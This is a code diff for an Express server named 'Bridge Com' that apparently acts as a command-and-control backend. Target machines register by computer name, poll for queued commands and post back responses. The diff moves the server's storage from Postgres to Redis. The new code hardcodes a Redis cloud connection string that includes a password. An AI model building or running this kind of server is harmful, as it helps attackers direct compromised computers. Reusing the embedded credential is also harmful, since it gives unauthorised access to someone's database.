@@ -1,47 +1,65 @@
 const express = require('express');
-const pool = require('./database/db'); // Import the pool from db.js
+const Redis = require('ioredis');
 const app = express();
 
+// Configuration Redis
+const redis = new Redis('redis://default:KJigfboh7I4DYdXfJMXbaq79hTRZ4o3J@redis-19821.c14.us-east-1-2.ec2.redns.redis-cloud.com:19821');
+
+redis.on('connect', () => {
+    console.log('Connecté à Redis');
+});
+
+redis.on('error', (err) => {
+    console.error('Erreur Redis: ', err);
+});
+
+// Middleware
 app.use(express.json());
 
-// Endpoint de base
+// Lire les données depuis Redis
+const readData = async () => {
+    try {
+        const data = await redis.get('data');
+        return data ? JSON.parse(data) : { cibleList: [], commandes: [], reponses: [] };
+    } catch (err) {
+        console.error("Erreur lors de la lecture de Redis:", err);
+        return { cibleList: [], commandes: [], reponses: [] };
+    }
+};
+
+// Écrire les données dans Redis
+const writeData = async (data) => {
+    try {
+        await redis.set('data', JSON.stringify(data));
+    } catch (err) {
+        console.error("Erreur lors de l'écriture dans Redis:", err);
+    }
+};
+
+// Point de terminaison de base
 app.get('/', (req, res) => {
     res.send({ message: 'Bridge Com !' });
 });
 
 // Récupération de la liste des cibles
 app.get('/cibles', async (req, res) => {
-    try {
-        const result = await pool.query('SELECT computer_name FROM cibleList');
-        res.json({ cibleList: result.rows.map(row => row.computer_name) });
-    } catch (err) {
-        console.error("Erreur lors de la récupération des cibles:", err);
-        res.status(500).json({ message: "Erreur serveur" });
-    }
+    const data = await readData();
+    res.json({ cibleList: data.cibleList });
+});
+
+// Récupération de la liste des commandes
+app.get('/commandes', async (req, res) => {
+    const data = await readData();
+    res.json({ commandes: data.commandes });
 });
 
 // Ajout d'un nom d'ordinateur
 app.post('/identify', async (req, res) => {
     const { computer_name = 'Unknown' } = req.body;
-    try {
-        await pool.query('INSERT INTO cibleList (computer_name) VALUES ($1)', [computer_name]);
-        const result = await pool.query('SELECT computer_name FROM cibleList');
-        res.json({ message: `Request from computer: ${computer_name}`, cibleList: result.rows.map(row => row.computer_name) });
-    } catch (err) {
-        console.error("Erreur lors de l'insertion du nom d'ordinateur:", err);
-        res.status(500).json({ message: "Erreur serveur" });
-    }
-});
-
-// Récupération de la liste des commandes
-app.get('/commandes', async (req, res) => {
-    try {
-        const result = await pool.query('SELECT commande FROM commandes');
-        res.json({ commandes: result.rows.map(row => row.commande) });
-    } catch (err) {
-        console.error("Erreur lors de la récupération des commandes:", err);
-        res.status(500).json({ message: "Erreur serveur" });
-    }
+    const data = await readData();
+    data.cibleList.push(computer_name);
+    await writeData(data);
+    res.json({ message: `Request from computer: ${computer_name}`, cibleList: data.cibleList });
 });
 
 // Ajout d'une commande
@@ -50,87 +68,24 @@ app.post('/commande', async (req, res) => {
     if (!commande) {
         return res.status(400).json({ message: "Commande est requise." });
     }
+    const data = await readData();
 
-    try {
-        const { rows } = await pool.query('SELECT * FROM commandes WHERE commande LIKE $1', [`${commande.split('%')[0]}%`]);
+    let isExist = false;
 
-        if (rows.length > 0) {
-            await pool.query('UPDATE commandes SET commande = $1 WHERE id = $2', [commande, rows[0].id]);
-        } else {
-            await pool.query('INSERT INTO commandes (commande) VALUES ($1)', [commande]);
+    for (let i = 0; i < data.commandes.length; i++) {
+        const dataInfo = data.commandes[i].split("%");
+        const cmdInfo = commande.split("%");
+        if (dataInfo[0] == cmdInfo[0]) {
+            data.commandes[i] = commande;
+            isExist = true;
         }
-
-        const result = await pool.query('SELECT commande FROM commandes');
-        res.json({ message: `Commande ajoutée: ${commande}`, commandes: result.rows.map(row => row.commande) });
-    } catch (err) {
-        console.error("Erreur lors de l'ajout de la commande:", err);
-        res.status(500).json({ message: "Erreur serveur" });
     }
+
+    if (!isExist) data.commandes.push(commande);
+    await writeData(data);
+    res.json({ message: `Commande ajoutée: ${commande}`, commandes: data.commandes });
 });
 
-// Récupération d'une commande
-app.post('/getCommande', async (req, res) => {
-    const { info } = req.body;
-    try {
-        const { rows } = await pool.query('SELECT commande FROM commandes WHERE commande LIKE $1', [`${info.split('%')[0]}%`]);
-
-        const matchedCommande = rows.find(cmd => {
-            const cmdParts = cmd.commande.split('%');
-            const infoParts = info.split('%');
-            return cmdParts[0] === infoParts[0] && (cmdParts[1] !== infoParts[1] || cmdParts[2] !== infoParts[2]);
-        });
-
-        if (matchedCommande) {
-            res.json({ message: 'nouveau commande', commandes: matchedCommande.commande });
-        } else {
-            res.json({ message: 'Aucune nouveau commande' });
-        }
-    } catch (err) {
-        console.error("Erreur lors de la récupération de la commande:", err);
-        res.status(500).json({ message: "Erreur serveur" });
-    }
-});
-
-// Ajout d'une reponse
-app.post('/reponse', async (req, res) => {
-    const { reponse } = req.body;
-    if (!reponse) {
-        return res.status(400).json({ message: "Reponse est requise." });
-    }
-
-    try {
-        const { rows } = await pool.query('SELECT * FROM reponses WHERE reponse LIKE $1', [`${reponse.split('%')[0]}%`]);
-
-        if (rows.length > 0) {
-            await pool.query('UPDATE reponses SET reponse = $1 WHERE id = $2', [reponse, rows[0].id]);
-        } else {
-            await pool.query('INSERT INTO reponses (reponse) VALUES ($1)', [reponse]);
-        }
-
-        const result = await pool.query('SELECT reponse FROM reponses');
-        res.json({ message: `Reponse ajoutée: ${reponse}`, reponses: result.rows.map(row => row.reponse) });
-    } catch (err) {
-        console.error("Erreur lors de l'ajout de la réponse:", err);
-        res.status(500).json({ message: "Erreur serveur" });
-    }
-});
-
-// Récupération d'une reponse
-app.post('/getReponse', async (req, res) => {
-    const { info } = req.body;
-    try {
-        const { rows } = await pool.query('SELECT reponse FROM reponses WHERE reponse LIKE $1', [`${info}%`]);
-
-        if (rows.length > 0) {
-            res.json({ message: 'reponse', reponse: rows[0].reponse });
-        } else {
-            res.json({ message: 'Aucune reponse' });
-        }
-    } catch (err) {
-        console.error("Erreur lors de la récupération de la réponse:", err);
-        res.status(500).json({ message: "Erreur serveur" });
-    }
-});
-
+// Écoute sur le port
 const PORT = 5000;
 app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
